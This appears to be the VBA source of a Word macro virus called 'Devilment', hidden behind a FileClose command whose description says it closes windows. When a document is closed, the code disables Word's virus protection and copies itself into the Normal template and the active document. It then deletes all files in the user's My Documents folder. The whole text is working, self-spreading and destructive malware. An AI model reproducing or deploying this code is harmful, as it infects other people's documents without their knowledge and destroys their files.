   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Devilment"
   Sub FileClose()
   Attribute FileClose.VB_Description = "Closes all of the windows of the active document"
   Attribute FileClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileClose"
   'Devilment
   'An experiment in Macro programming ;)
   'Ha Ha Ha
    On Error Resume Next
     Application.Options.VirusProtection = False
     Application.Options.SaveNormalPrompt = False
     Application.Options.ConfirmConversions = False
     Dim x As Integer
     Dim found As Boolean
     found = False
     x = 1
     For x = 1 To NormalTemplate.VBProject.VBComponents.Count
       If NormalTemplate.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'Devilment" Then found = False
     Next x
     If Not found Then
       Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "devilment", wdOrganizerObjectProjectItems
     End If
     If NormalTemplate.Saved = False Then NormalTemplate.Save

     found = False
     x = 1
     For x = 1 To ActiveDocument.VBProject.VBComponents.Count
       If ActiveDocument.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'Devilment" Then found = False
     Next x
     If Not found Then
       NormalTemplate.VBProject.VBComponents("devilment").Export ("c:\devilment.tmp")
       ActiveDocument.VBProject.VBComponents.Import ("c:\devilment.tmp")
       ActiveDocument.SaveAs ActiveDocument.FullName
       Kill ("c:\devilment.tmp")
       Kill ("c:\mydocu~1\*.*")
     End If '
       WordBasic.FileClose

   End Sub
